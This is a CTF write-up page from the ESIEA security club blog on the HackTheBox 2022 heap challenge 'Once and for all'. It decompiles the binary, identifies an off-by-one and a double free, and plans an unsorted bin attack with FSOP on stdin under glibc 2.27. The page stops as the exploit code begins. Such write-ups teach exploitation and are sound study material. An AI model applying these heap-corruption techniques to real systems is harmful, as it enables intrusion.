<!DOCTYPE html>
<html><head>
<title>[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all" />
<meta property="og:description" content="Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
Reverse engineering All the snippets of pseudo-code are issued by IDA freeware:
int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://clubsecu-esiea.github.io/posts/onceandforall/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-19T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-05-19T00:00:00+00:00" /><meta property="og:site_name" content="ESIEA security club" />






<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all"/>
<meta name="twitter:description" content="Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
Reverse engineering All the snippets of pseudo-code are issued by IDA freeware:
int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp&#43;18h] [rbp-8h] BYREF  int i; // [rsp&#43;1Ch] [rbp-4h]  for ( i = 0; i &lt;= 49; &#43;&#43;i ) { puts(s); printf(&amp;unk_1310); __isoc99_scanf(&amp;unk_13C8, &amp;v4); puts(s); switch ( v4 ) { case 1: small_alloc(s); break; case 2: fix(s); break; case 3: examine(s); break; case 4: savebig(s); break; case 5: exit(0); default: puts(&#34;[-] Invalid choice!"/>







<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">


  






<link rel="stylesheet" href="https://clubsecu-esiea.github.io/scss/journal.min.0f46f98b723f2aad4b02d9370bb6aa7848b5c2b2a5579642014082283683d2d8.css" integrity="sha256-D0b5i3I/Kq1LAtk3C7aqeEi1wrKlV5ZCAUCCKDaD0tg=" media="screen">



<link rel="stylesheet" href="https://clubsecu-esiea.github.io/scss/dark-mode.min.79c34391dbcff20df8b4dac718e2606701efcbfdb9f3b08447ac39ac9dc7b463.css" integrity="sha256-ecNDkdvP8g34tNrHGOJgZwHvy/2587CER6w5rJ3HtGM=" media="screen">


<script src="/vendor/js/loadCSS.js"></script>
<script>
  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
</script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          
          
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          
          throwOnError : false
        });
    });
</script>



  <script src="/js/toc.js"></script>



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="/vendor/js/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
  clientID: '',
  clientSecret: '',
  repo: '',
  owner: '',
  admin: [''],
  id: md5(location.pathname),
  distractionFreeMode: 'false'
  });
  window.onload = function () {
        gitalk.render('gitalk-container')
  }
</script>












</head>
<body>
    	<div id="app"><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://clubsecu-esiea.github.io/">
    
        <div class="nav-title">
            ESIEA security club
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/about/">
                About us
            </a>
            
        
            
            
            
                
            
            
            
            <a class="a-block nav-link-item active" href="/posts">
                Archive
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                Categories
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                Tags
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reverse-engineering" onclick="onNavClick(`#reverse-engineering-nav`)" id="reverse-engineering-nav">
									Reverse engineering
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#exploitation" onclick="onNavClick(`#exploitation-nav`)" id="exploitation-nav">
									Exploitation
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#what-we-have" onclick="onNavClick(`#what-we-have-nav`)" id="what-we-have-nav">
									What we have
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#restrictions" onclick="onNavClick(`#restrictions-nav`)" id="restrictions-nav">
									Restrictions
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#how-to-leak-libc-" onclick="onNavClick(`#how-to-leak-libc--nav`)" id="how-to-leak-libc--nav">
									How to leak libc ?
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#what-can-we-target-in-the-libc-" onclick="onNavClick(`#what-can-we-target-in-the-libc--nav`)" id="what-can-we-target-in-the-libc--nav">
									What can we target in the libc ?
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#unsorted-bin-attack-on-stdin-_io_buf_end" onclick="onNavClick(`#unsorted-bin-attack-on-stdin-_io_buf_end-nav`)" id="unsorted-bin-attack-on-stdin-_io_buf_end-nav">
									Unsorted bin attack on stdin-&gt;_IO_buf_end
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#fsop--profit" onclick="onNavClick(`#fsop--profit-nav`)" id="fsop--profit-nav">
									FSOP &#43; PROFIT
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div>
<div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/about/">
                    About us
                </a>
                
            
                
                
                
                    
                
                
                
                <a class="a-block drawer-menu-item active" href="/posts">
                    Archive
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    Categories
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    Tags
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reverse-engineering" onclick="onNavClick(`#reverse-engineering-nav`)" id="reverse-engineering-nav">
									Reverse engineering
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#exploitation" onclick="onNavClick(`#exploitation-nav`)" id="exploitation-nav">
									Exploitation
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#what-we-have" onclick="onNavClick(`#what-we-have-nav`)" id="what-we-have-nav">
									What we have
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#restrictions" onclick="onNavClick(`#restrictions-nav`)" id="restrictions-nav">
									Restrictions
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#how-to-leak-libc-" onclick="onNavClick(`#how-to-leak-libc--nav`)" id="how-to-leak-libc--nav">
									How to leak libc ?
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#what-can-we-target-in-the-libc-" onclick="onNavClick(`#what-can-we-target-in-the-libc--nav`)" id="what-can-we-target-in-the-libc--nav">
									What can we target in the libc ?
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#unsorted-bin-attack-on-stdin-_io_buf_end" onclick="onNavClick(`#unsorted-bin-attack-on-stdin-_io_buf_end-nav`)" id="unsorted-bin-attack-on-stdin-_io_buf_end-nav">
									Unsorted bin attack on stdin-&gt;_IO_buf_end
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#fsop--profit" onclick="onNavClick(`#fsop--profit-nav`)" id="fsop--profit-nav">
									FSOP &#43; PROFIT
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://clubsecu-esiea.github.io/">
            ESIEA security club
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://clubsecu-esiea.github.io/">
        <div class="single-column-header-title">ESIEA security club</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    [HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2022-05-19 00:00
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/pwn">pwn</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/ctf">ctf</a>
                                &nbsp;
                            
                                <a href="/tags/hackthebox">HackTheBox</a>
                                &nbsp;
                            
                                <a href="/tags/advanced">advanced</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <p>Once and for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.</p>
<h1 id="reverse-engineering">Reverse engineering</h1>
<p>All the snippets of pseudo-code are issued by <a href="https://hex-rays.com/ida-free/">IDA freeware</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">49</span>; <span style="color:#f92672">++</span>i )
  {
    puts(s);
    printf(<span style="color:#f92672">&amp;</span>unk_1310);
    __isoc99_scanf(<span style="color:#f92672">&amp;</span>unk_13C8, <span style="color:#f92672">&amp;</span>v4);
    puts(s);
    <span style="color:#66d9ef">switch</span> ( v4 )
    {
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
        small_alloc(s);
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
        fix(s);
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
        examine(s);
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
        savebig(s);
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
        exit(<span style="color:#ae81ff">0</span>);
      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
        puts(<span style="color:#e6db74">&#34;[-] Invalid choice!&#34;</span>);
        <span style="color:#66d9ef">break</span>;
    }
  }
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>The binary allows us to allocate a small chunk between <code>0x1f</code> and <code>0x38</code> bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">small_alloc</span>()
{
  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  size_t nmemb; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> idx[<span style="color:#ae81ff">3</span>]; <span style="color:#75715e">// [rsp+8h] [rbp-18h] BYREF
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">if</span> ( allocated <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span> )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;Nothing more!&#34;</span>);
  <span style="color:#f92672">++</span>allocated;
  printf(<span style="color:#e6db74">&#34;Choose an index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, idx);
  <span style="color:#66d9ef">if</span> ( size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">||</span> (<span style="color:#f92672">&amp;</span>alloc_array)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">||</span> idx[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xEuLL</span> )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;[-] Invalid!&#34;</span>);
  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How much space do you need for it: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>nmemb);
  <span style="color:#66d9ef">if</span> ( nmemb <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1F</span> <span style="color:#f92672">||</span> nmemb <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x38</span> )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;[-] Your inventory cannot provide this type of space!&#34;</span>);
  size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> nmemb;
  v1 <span style="color:#f92672">=</span> idx[<span style="color:#ae81ff">0</span>];
  (<span style="color:#f92672">&amp;</span>alloc_array)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)calloc(nmemb, <span style="color:#ae81ff">1uLL</span>);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#f92672">&amp;</span>alloc_array)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx[<span style="color:#ae81ff">0</span>]] )
  {
    puts(<span style="color:#e6db74">&#34;[-] Something didn&#39;t work out...&#34;</span>);
    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
  }
  puts(<span style="color:#e6db74">&#34;Input your weapon&#39;s details: &#34;</span>);
  
  <span style="color:#75715e"># off-by-one
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> read(<span style="color:#ae81ff">0</span>, (<span style="color:#f92672">&amp;</span>alloc_array)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx[<span style="color:#ae81ff">0</span>]], nmemb <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>As you can see the function above contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
<p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fix</span>()
{
  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> idx; <span style="color:#75715e">// [rsp+8h] [rbp-28h] BYREF
</span><span style="color:#75715e"></span>  size_t size; <span style="color:#75715e">// [rsp+10h] [rbp-20h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4[<span style="color:#ae81ff">3</span>]; <span style="color:#75715e">// [rsp+18h] [rbp-18h] BYREF
</span><span style="color:#75715e"></span>
  printf(<span style="color:#e6db74">&#34;Choose an index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xE</span> )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;[-] Invalid!&#34;</span>);
  puts(<span style="color:#e6db74">&#34;Ok, let&#39;s get you some new parts for this one... seems like it&#39;s broken&#34;</span>);
  free(alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]);
  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How much space do you need for this repair: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>size);
  <span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1F</span> <span style="color:#f92672">||</span> size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x38</span> )
    <span style="color:#75715e"># [1] 
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;[-] Your inventory cannot provide this type of space.&#34;</span>);
  size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">=</span> size;
  v1 <span style="color:#f92672">=</span> idx;
  alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] <span style="color:#f92672">=</span> calloc(size, <span style="color:#ae81ff">1uLL</span>);
  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] )
  {
    puts(<span style="color:#e6db74">&#34;Something didn&#39;t work out...&#34;</span>);
    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
  }
  puts(<span style="color:#e6db74">&#34;Input your weapon&#39;s details: &#34;</span>);
  read(<span style="color:#ae81ff">0</span>, alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx], size);
  printf(<span style="color:#e6db74">&#34;What would you like to do now?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1. Verify weapon</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Continue</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, v4);
  result <span style="color:#f92672">=</span> v4[<span style="color:#ae81ff">0</span>];
  <span style="color:#66d9ef">if</span> ( v4[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
  {
    <span style="color:#66d9ef">if</span> ( verified )
    {
      <span style="color:#66d9ef">return</span> puts(<span style="color:#f92672">&amp;</span>unk_1648);
    }
    <span style="color:#66d9ef">else</span>
    {
      result <span style="color:#f92672">=</span> puts((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]);
      verified <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    }
  }
  <span style="color:#66d9ef">return</span> result;
}
</code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
<p>We can print a chunk only once:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">examine</span>()
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// [rsp+8h] [rbp-8h] BYREF
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">if</span> ( examined )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#f92672">&amp;</span>unk_14D0);
  examined <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
  printf(<span style="color:#e6db74">&#34;Choose an index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
  <span style="color:#66d9ef">if</span> ( size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] <span style="color:#f92672">&amp;&amp;</span> alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] <span style="color:#f92672">&amp;&amp;</span> v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xE</span> )
    <span style="color:#66d9ef">return</span> puts((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)alloc_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]);
  <span style="color:#66d9ef">else</span>
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;[-] Invalid!&#34;</span>);
}
</code></pre></div><p>Finally we can malloc a huge chunk, but we cannot write anything within:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">savebig</span>()
{
  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v0; <span style="color:#75715e">// rax
</span><span style="color:#75715e"></span>  size_t size; <span style="color:#75715e">// [rsp+8h] [rbp-8h] BYREF
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">if</span> ( chungus_weapon <span style="color:#f92672">||</span> qword_202068 )
  {
    LODWORD(v0) <span style="color:#f92672">=</span> puts(<span style="color:#f92672">&amp;</span>unk_16E8);
  }
  <span style="color:#66d9ef">else</span>
  {
    printf(<span style="color:#e6db74">&#34;How much space do you need for this massive weapon: &#34;</span>);
    __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>size);
    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x5AFu</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xF5C0u</span> )
    {
      puts(<span style="color:#e6db74">&#34;Adding to your inventory..&#34;</span>);
      chungus_weapon <span style="color:#f92672">=</span> size;
      v0 <span style="color:#f92672">=</span> malloc(size);
      qword_202068 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">__int64</span>)v0;
    }
    <span style="color:#66d9ef">else</span>
    {
      LODWORD(v0) <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;[-] This is not possible..&#34;</span>);
    }
  }
  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">int</span>)v0;
}
</code></pre></div><h1 id="exploitation">Exploitation</h1>
<h2 id="what-we-have">What we have</h2>
<ul>
<li>An off-by-one when we create a new chunk.</li>
<li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
<li>Trivial read after free thanks to the double free.</li>
</ul>
<h2 id="restrictions">Restrictions</h2>
<ul>
<li>The program does not use <code>printf</code> with a format specifier, then we cannot do a <a href="https://maxwelldulin.com/BlogPost?post=3107454976">House of husk</a>.</li>
<li>We can only allocate <code>15</code> chunks.</li>
<li>All the allocations except the big one are made using <code>calloc</code>, even if it can be easily bypassed by adding the <code>IS_MAPPED</code> flag to the chunk header to avoid zero-ing.</li>
<li>The libc version (<code>2.27</code>) mitigates a few techniques, especially the <a href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/">House of Orange</a> and introduces the <code>tcache</code>.</li>
<li>Allocations have to fit in only two fastbins (<code>0x30</code> / <code>0x40</code>), which means we cannot get an arbitrary write with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> =&gt; <code>0x70</code> fastbin against <code>0x30</code> / <code>0x40</code> in our case).</li>
</ul>
<h2 id="how-to-leak-libc-">How to leak libc ?</h2>
<p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunk that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, data, hang<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
